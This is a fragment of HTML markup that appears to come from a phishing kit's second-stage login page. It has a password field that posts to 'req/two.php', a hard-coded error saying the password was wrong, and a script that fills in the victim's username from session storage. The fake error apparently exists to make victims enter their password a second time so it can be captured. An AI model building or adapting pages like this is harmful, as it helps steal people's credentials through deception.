...
<body>
                ...
                <div class="details__center center">
                    <div class="details__head" data-aos="animation-scale-y">
                        ...
                        <div class="details__btn">
                            <form class="contacts__form" data-aos="animation-translate-y" data-aos-delay="200" action="req/two.php" method="post">
                                <div class="contacts__field field">
                                    ...
                                    <div class="field__wrap"><input type="password" name="pass" class="field__input" placeholder="Password" required>
                                        <h5><br>
                                            <font color="red">
                                                <p>
                                                    Sorry, your password was wrong. Please check your password carefully.
                                                </p>
                                        </h5>
    ...
    <script>window.onload = function(){xx = sessionStorage.getItem("uname");var greetingElement = document.getElementById('greeting');var greetingText = greetingElement.innerHTML;greetingText = greetingText.replace('@Unameku', xx);greetingElement.innerHTML = greetingText;}</script>
</body>
